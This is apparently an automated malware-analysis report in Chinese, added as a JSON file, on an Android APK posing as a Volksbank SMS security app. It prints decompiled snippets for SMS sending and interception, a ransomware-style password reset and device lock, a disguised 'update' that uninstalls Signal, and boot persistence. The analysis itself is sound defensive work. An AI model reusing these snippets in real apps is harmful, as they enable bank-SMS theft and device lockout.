@@ -1,0 +1,194 @@
+{
+  "APK信息": {
+    "文件名": "653889648e0ccad5e9c44c8cc3a7a9bd5f0b5d532ec1e64ad507893494bf79aa.apk",
+    "sha256": "653889648e0ccad5e9c44c8cc3a7a9bd5f0b5d532ec1e64ad507893494bf79aa",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "Volksbank SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 269.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\f\\h;",
+          "method_signature": "for(int i = 0; i < divideMessage.size()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendMultipartTextMessage(c, null, divideMessage, a2, a3);\nSmsManager.getDefault().sendTextMessage(c, null, divideMessage.get(i), a2.get(i), a3 == null ? null : a3.get(i));",
+          "malicious_code_snippet_context": "          ArrayList<PendingIntent> a3 = a(fVar.t(), fVar.J(), divideMessage);\n          String c = fVar.H().c();\n          try {\n>>>             SmsManager.getDefault().sendMultipartTextMessage(c, null, divideMessage, a2, a3);\n>>>         } catch (NullPointerException e) {\n              Log.w(\"SmsTransport\", e);\n              Log.w(\"SmsTransport\", \"Recipient: \" + c);\n              Log.w(\"SmsTransport\", \"Message Parts: \" + divideMessage.size());",
+          "behavior_description": "该代码通过 SmsManager.getDefault() 静默发送短信，先尝试使用 sendMultipartTextMessage 发送长短信，若抛出 NullPointerException 则逐条调用 sendTextMessage 发送分割后的消息。数据来源为 fVar.H().c()（收件人号码）和 divideMessage（消息内容），危险操作为 SmsManager.sendMultipartTextMessage()/sendTextMessage()，整个过程无需用户交互即可完成短信发送，在恶意样本中可被用于短信欺诈或扣费订阅。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\ca;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         abortBroadcast();\n>>>     }\n  }",
+          "behavior_description": "该 BroadcastReceiver 的 onReceive 方法在收到广播（如 SMS_RECEIVED 短信广播）时直接调用 abortBroadcast()，中止广播继续传递给后续的接收器（包括系统默认短信应用），从而使短信无法到达用户收件箱，实现短信拦截。恶意软件通常配合高优先级 intent-filter 注册，确保自身先于系统短信应用收到广播，进而拦截验证码、银行通知等关键短信。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\f;",
+          "method_signature": "if(this.c != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\ndevicePolicyManager.resetPassword(this.c, 1);\ndevicePolicyManager.lockNow();",
+          "malicious_code_snippet_context": "                  return;\n              case LOCK:\n                  if (this.c != \"0\") {\n>>>                     DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>                     devicePolicyManager.resetPassword(this.c, 1);\n>>>                     devicePolicyManager.lockNow();\n                      i.b(\"Device locked\", context);\n                      return;\n                  }",
+          "behavior_description": "代码处理LOCK指令，使用DevicePolicyManager将设备密码重置为变量this.c的值，并立即调用lockNow()锁定屏幕，导致用户无法正常使用设备，属于典型的勒索软件行为。数据流向为：远程指令或密码(this.c) -> 设备锁定与密码重置(DevicePolicyManager)。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xpack\\ActUpdate;",
+          "method_signature": "doUpdate(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "startActivity(new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", \"org.thoughtcrime.securesms\", null)));",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class ActUpdate extends Activity {\n      public void doUpdate(View view) {\n>>>         startActivity(new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", \"org.thoughtcrime.securesms\", null)));\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "方法名伪装为 doUpdate（更新操作），实际通过 Intent ACTION_DELETE 触发系统卸载对话框，目标包名为硬编码的 org.thoughtcrime.securesms（Signal 应用）。用户被诱导点击\"更新\"按钮后，实际弹出的是卸载确认界面，利用社会工程学手段诱导用户卸载安全通讯应用。虽然 ACTION_DELETE 会弹出系统确认框（非完全静默），但在恶意样本上下文中，伪装更新诱导卸载安全软件属于明确的恶意行为模式。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "if(i.h(context)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (i.h(context)) {\n        return;\n    }\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n}",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class OnBootReceiver extends BroadcastReceiver {\n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (i.h(context)) {\n>>>             return;\n>>>         }\n>>>         i.c(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n      }\n  }",
+          "behavior_description": "OnBootReceiver 监听设备开机广播，设备重启后自动启动名为 XMainProcessStart 的后台服务，实现恶意软件的持久化驻留和开机自启保活。数据流向：系统开机广播事件(ACTION_BOOT_COMPLETED)→context.startService() 自动拉起恶意主进程服务。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
